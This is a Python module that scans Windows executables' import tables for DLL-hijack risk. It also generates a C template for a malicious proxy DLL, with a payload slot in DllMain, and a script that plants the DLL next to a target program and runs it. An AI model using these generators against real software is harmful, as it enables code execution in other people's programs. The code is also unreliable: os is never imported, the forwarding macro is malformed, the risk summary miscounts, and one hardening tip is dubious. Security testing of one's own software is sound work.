"""
动态链接库劫持检测与利用生成模块

检测Windows PE中潜在的DLL劫持漏洞（缺失的DLL、不安全搜索路径），
自动生成恶意DLL骨架代码和利用脚本，验证劫持可行性。

Author: LLM-Assisted Binary Vulnerability Analysis Tool
Version: 1.3.1
"""

import logging
import struct
import pefile
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Set
from pathlib import Path

logger = logging.getLogger(__name__)


class HijackRiskLevel(Enum):
    """劫持风险等级"""
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    NONE = "none"


class ImportType(Enum):
    """导入类型"""
    ORDINAL = "ordinal"
    BY_NAME = "by_name"
    DELAY_LOAD = "delay_load"


@dataclass
class ImportedDLL:
    """导入的DLL信息"""
    name: str
    has_path: bool = False
    path: Optional[str] = None
    imports: List[str] = field(default_factory=list)
    import_type: ImportType = ImportType.BY_NAME
    risk_level: HijackRiskLevel = HijackRiskLevel.NONE
    is_system_dll: bool = False
    known_hijack_dll: bool = False


@dataclass
class HijackResult:
    """劫持检测结果"""
    vulnerable_dlls: List[ImportedDLL] = field(default_factory=list)
    delay_load_dlls: List[ImportedDLL] = field(default_factory=list)
    system_dlls: List[ImportedDLL] = field(default_factory=list)
    risk_summary: str = ""
    recommendations: List[str] = field(default_factory=list)


# 已知可劫持的DLL列表
KNOWN_HIJACK_DLLS = {
    "version.dll",
    "userenv.dll",
    "ws2_32.dll",
    "wsock32.dll",
    "winmm.dll",
    "wininet.dll",
    "urlmon.dll",
    "uxtheme.dll",
    "shlwapi.dll",
    "shell32.dll",
    "riched20.dll",
    "powrprof.dll",
    "mswsock.dll",
    "msvcrt.dll",
    "mshtml.dll",
    "mpr.dll",
    "lz32.dll",
    "imm32.dll",
    "hnetcfg.dll",
    "gdi32.dll",
    "dwmapi.dll",
    "crypt32.dll",
    "comctl32.dll",
    "advapi32.dll",
    "aclui.dll",
}

# 系统DLL列表（通常在System32中）
SYSTEM_DLLS = {
    "ntdll.dll",
    "kernel32.dll",
    "user32.dll",
    "gdi32.dll",
    "advapi32.dll",
    "shell32.dll",
    "comctl32.dll",
    "ole32.dll",
    "oleaut32.dll",
    "msvcrt.dll",
    "ws2_32.dll",
    "winmm.dll",
    "imm32.dll",
    "version.dll",
    "shlwapi.dll",
}


class DLLHijackAnalyzer:
    """
    DLL劫持分析器
    
    静态分析PE文件的导入表，检测潜在的DLL劫持漏洞。
    """
    
    def __init__(self, pe_path: Optional[str] = None):
        """
        初始化DLL劫持分析器
        
        Args:
            pe_path: PE文件路径
        """
        self.pe_path = pe_path
        self.pe: Optional[pefile.PE] = None
        self.imported_dlls: List[ImportedDLL] = []
        
    def load_pe(self, pe_path: Optional[str] = None) -> bool:
        """
        加载PE文件
        
        Args:
            pe_path: PE文件路径，若为None则使用初始化时的路径
            
        Returns:
            是否加载成功
        """
        path = pe_path or self.pe_path
        if not path:
            logger.error("未指定PE文件路径")
            return False
            
        try:
            self.pe = pefile.PE(path)
            self.pe_path = path
            return True
        except Exception as e:
            logger.error(f"加载PE文件失败: {e}")
            return False
            
    def analyze_imports(self) -> List[ImportedDLL]:
        """
        分析PE文件的导入表
        
        Returns:
            导入的DLL列表
        """
        if not self.pe:
            logger.error("PE文件未加载")
            return []
            
        self.imported_dlls = []
        
        if hasattr(self.pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in self.pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode('utf-8', errors='replace').lower()
                imports = []
                
                for imp in entry.imports:
                    if imp.name:
                        imports.append(imp.name.decode('utf-8', errors='replace'))
                    else:
                        imports.append(f"ordinal_{imp.ordinal}")
                
                imported_dll = self._analyze_dll_import(dll_name, imports, ImportType.BY_NAME)
                self.imported_dlls.append(imported_dll)
        
        # 检查延迟加载
        if hasattr(self.pe, 'DIRECTORY_ENTRY_DELAY_IMPORT'):
            for entry in self.pe.DIRECTORY_ENTRY_DELAY_IMPORT:
                dll_name = entry.dll.decode('utf-8', errors='replace').lower()
                imports = []
                
                for imp in entry.imports:
                    if imp.name:
                        imports.append(imp.name.decode('utf-8', errors='replace'))
                    else:
                        imports.append(f"ordinal_{imp.ordinal}")
                
                imported_dll = self._analyze_dll_import(dll_name, imports, ImportType.DELAY_LOAD)
                self.imported_dlls.append(imported_dll)
        
        return self.imported_dlls
    
    def _analyze_dll_import(self, dll_name: str, imports: List[str], import_type: ImportType) -> ImportedDLL:
        """
        分析单个DLL导入
        
        Args:
            dll_name: DLL名称
            imports: 导入的函数列表
            import_type: 导入类型
            
        Returns:
            ImportedDLL对象
        """
        has_path = '\\' in dll_name or '/' in dll_name
        is_system_dll = dll_name in SYSTEM_DLLS
        known_hijack_dll = dll_name in KNOWN_HIJACK_DLLS
        
        # 评估风险等级
        risk_level = self._evaluate_risk(dll_name, has_path, is_system_dll, known_hijack_dll, import_type)
        
        return ImportedDLL(
            name=dll_name,
            has_path=has_path,
            imports=imports,
            import_type=import_type,
            risk_level=risk_level,
            is_system_dll=is_system_dll,
            known_hijack_dll=known_hijack_dll
        )
    
    def _evaluate_risk(self, dll_name: str, has_path: bool, is_system_dll: bool, 
                       known_hijack_dll: bool, import_type: ImportType) -> HijackRiskLevel:
        """
        评估DLL劫持风险
        
        Args:
            dll_name: DLL名称
            has_path: 是否包含路径
            is_system_dll: 是否系统DLL
            known_hijack_dll: 是否已知可劫持DLL
            import_type: 导入类型
            
        Returns:
            风险等级
        """
        if has_path:
            # 指定了完整路径，风险较低
            if import_type == ImportType.DELAY_LOAD:
                return HijackRiskLevel.LOW
            return HijackRiskLevel.NONE
            
        if known_hijack_dll:
            # 已知可劫持的DLL
            return HijackRiskLevel.HIGH
            
        if is_system_dll:
            # 系统DLL，通常在System32中，风险中等
            if import_type == ImportType.DELAY_LOAD:
                return HijackRiskLevel.MEDIUM
            return HijackRiskLevel.LOW
            
        # 非系统DLL且未指定路径
        if import_type == ImportType.DELAY_LOAD:
            return HijackRiskLevel.HIGH
            
        return HijackRiskLevel.MEDIUM
    
    def detect_hijack_vulnerabilities(self) -> HijackResult:
        """
        检测DLL劫持漏洞
        
        Returns:
            劫持检测结果
        """
        result = HijackResult()
        
        if not self.imported_dlls:
            self.analyze_imports()
            
        for dll in self.imported_dlls:
            if dll.risk_level == HijackRiskLevel.HIGH:
                result.vulnerable_dlls.append(dll)
            elif dll.import_type == ImportType.DELAY_LOAD:
                result.delay_load_dlls.append(dll)
            elif dll.is_system_dll:
                result.system_dlls.append(dll)
        
        result.risk_summary = self._generate_risk_summary(result)
        result.recommendations = self._generate_recommendations(result)
        
        return result
    
    def _generate_risk_summary(self, result: HijackResult) -> str:
        """
        生成风险摘要
        
        Args:
            result: 劫持检测结果
            
        Returns:
            风险摘要字符串
        """
        high_count = len([d for d in result.vulnerable_dlls if d.risk_level == HijackRiskLevel.HIGH])
        medium_count = len([d for d in result.vulnerable_dlls if d.risk_level == HijackRiskLevel.MEDIUM])
        
        if high_count > 0:
            return f"高风险: {high_count} 个DLL，中风险: {medium_count} 个DLL"
        elif medium_count > 0:
            return f"中风险: {medium_count} 个DLL"
        else:
            return "未发现高风险DLL劫持漏洞"
    
    def _generate_recommendations(self, result: HijackResult) -> List[str]:
        """
        生成修复建议
        
        Args:
            result: 劫持检测结果
            
        Returns:
            建议列表
        """
        recommendations = []
        
        if result.vulnerable_dlls:
            recommendations.append("建议使用完整路径加载DLL（如C:\\Windows\\System32\\xxx.dll）")
            recommendations.append("考虑使用延迟加载并在运行时验证DLL签名")
            recommendations.append("将第三方DLL与应用程序放在同一目录")
            
        if result.delay_load_dlls:
            recommendations.append("延迟加载DLL需特别注意，攻击者可在加载前替换")
            
        recommendations.append("启用ASLR和DEP等安全措施")
        recommendations.append("使用代码签名验证加载的DLL")
        
        return recommendations
    
    def generate_hijack_dll_code(self, target_dll: str, output_path: Optional[str] = None) -> str:
        """
        生成劫持DLL的C代码模板
        
        Args:
            target_dll: 目标DLL名称
            output_path: 输出文件路径（可选）
            
        Returns:
            C代码字符串
        """
        code = f"""// DLL劫持代码模板 - 劫持 {target_dll}
// 编译命令: cl /LD /O2 {{filename}}.c

#include <windows.h>
#include <stdio.h>
#include <string.h>

// 原始DLL路径
#define ORIGINAL_DLL L"{target_dll}"

// 存储原始DLL的句柄
HMODULE g_hOriginalDll = NULL;

// 导出函数转发宏
#define FORWARD_FUNCTION(ret, func, args) \\
ret WINAPI My_##func args {{ \\
    static ret (WINAPI *pOriginal)(args) = NULL; \\
    if (!pOriginal) {{ \\
        pOriginal = (ret (WINAPI*)(args))GetProcAddress(g_hOriginalDll, #func); \\
    }} \\
    return pOriginal args; \\
}}

// 初始化时加载原始DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    switch (fdwReason) {{
        case DLL_PROCESS_ATTACH:
            // 加载原始DLL
            {{
                WCHAR szPath[MAX_PATH];
                GetSystemDirectoryW(szPath, MAX_PATH);
                wcscat_s(szPath, MAX_PATH, L"\\\\");
                wcscat_s(szPath, MAX_PATH, ORIGINAL_DLL);
                g_hOriginalDll = LoadLibraryW(szPath);
                if (!g_hOriginalDll) {{
                    // 尝试从应用程序目录加载
                    GetModuleFileNameW(NULL, szPath, MAX_PATH);
                    WCHAR *p = wcsrchr(szPath, L'\\\\');
                    if (p) *p = 0;
                    wcscat_s(szPath, MAX_PATH, L"\\\\");
                    wcscat_s(szPath, MAX_PATH, ORIGINAL_DLL);
                    g_hOriginalDll = LoadLibraryW(szPath);
                }}
            }}
            
            // 执行恶意Payload
            {{
                // TODO: 在此添加恶意代码
                // 示例：创建文件
                FILE *f = fopen("C:\\\\temp\\\\hijacked.txt", "w");
                if (f) {{
                    fprintf(f, "DLL Hijack Successful! PID: %d\\n", GetCurrentProcessId());
                    fclose(f);
                }}
            }}
            break;
            
        case DLL_PROCESS_DETACH:
            if (g_hOriginalDll) {{
                FreeLibrary(g_hOriginalDll);
            }}
            break;
    }}
    return TRUE;
}}

// 需要转发的函数声明
// TODO: 根据目标DLL的导出表添加转发函数
// 示例:
// FORWARD_FUNCTION(int, MessageBoxA, (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType))
"""
        
        if output_path:
            try:
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(code)
                logger.info(f"DLL劫持代码已保存到: {output_path}")
            except Exception as e:
                logger.error(f"保存DLL劫持代码失败: {e}")
        
        return code
    
    def generate_test_script(self, target_exe: str, dll_path: str) -> str:
        """
        生成测试脚本
        
        Args:
            target_exe: 目标可执行文件路径
            dll_path: 劫持DLL路径
            
        Returns:
            测试脚本字符串
        """
        script = '''#!/usr/bin/env python3
# DLL劫持测试脚本
# 用于验证DLL劫持漏洞是否可利用

import os
import shutil
import subprocess
import sys

def test_dll_hijack(target_exe, dll_path):
    """测试DLL劫持"""
    print(f"[+] 目标程序: {target_exe}")
    print(f"[+] 劫持DLL: {dll_path}")
    
    # 获取目标程序目录
    exe_dir = os.path.dirname(target_exe)
    if not exe_dir:
        exe_dir = os.getcwd()
    
    # 复制DLL到目标目录
    dll_name = os.path.basename(dll_path)
    target_dll_path = os.path.join(exe_dir, dll_name)
    
    print(f"[+] 将DLL复制到: {target_dll_path}")
    try:
        shutil.copy(dll_path, target_dll_path)
    except Exception as e:
        print(f"[-] 复制DLL失败: {e}")
        return False
    
    # 运行目标程序
    print(f"[+] 运行目标程序...")
    try:
        proc = subprocess.Popen([target_exe], cwd=exe_dir)
        proc.wait(timeout=10)
        print(f"[+] 程序退出码: {proc.returncode}")
        return True
    except subprocess.TimeoutExpired:
        print(f"[+] 程序运行超时，可能已成功劫持")
        proc.kill()
        return True
    except Exception as e:
        print(f"[-] 运行程序失败: {e}")
        return False
    finally:
        # 清理
        if os.path.exists(target_dll_path):
            os.remove(target_dll_path)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"用法: {sys.argv[0]} <target_exe> <hijack_dll>")
        sys.exit(1)
    
    target_exe = sys.argv[1]
    dll_path = sys.argv[2]
    
    success = test_dll_hijack(target_exe, dll_path)
    sys.exit(0 if success else 1)
'''
        return script


def analyze_dll_hijack(pe_path: str) -> HijackResult:
    """
    便捷函数：分析PE文件的DLL劫持漏洞
    
    Args:
        pe_path: PE文件路径
        
    Returns:
        劫持检测结果
    """
    analyzer = DLLHijackAnalyzer(pe_path)
    if analyzer.load_pe():
        analyzer.analyze_imports()
        return analyzer.detect_hijack_vulnerabilities()
    return HijackResult()


def generate_hijack_dll(pe_path: str, output_dir: str = ".") -> List[str]:
    """
    便捷函数：为PE文件生成劫持DLL代码
    
    Args:
        pe_path: PE文件路径
        output_dir: 输出目录
        
    Returns:
        生成的文件路径列表
    """
    generated_files = []
    analyzer = DLLHijackAnalyzer(pe_path)
    
    if not analyzer.load_pe():
        return generated_files
    
    analyzer.analyze_imports()
    result = analyzer.detect_hijack_vulnerabilities()
    
    for dll in result.vulnerable_dlls:
        output_path = os.path.join(output_dir, f"hijack_{dll.name.replace('.dll', '')}.c")
        analyzer.generate_hijack_dll_code(dll.name, output_path)
        generated_files.append(output_path)
    
    return generated_files
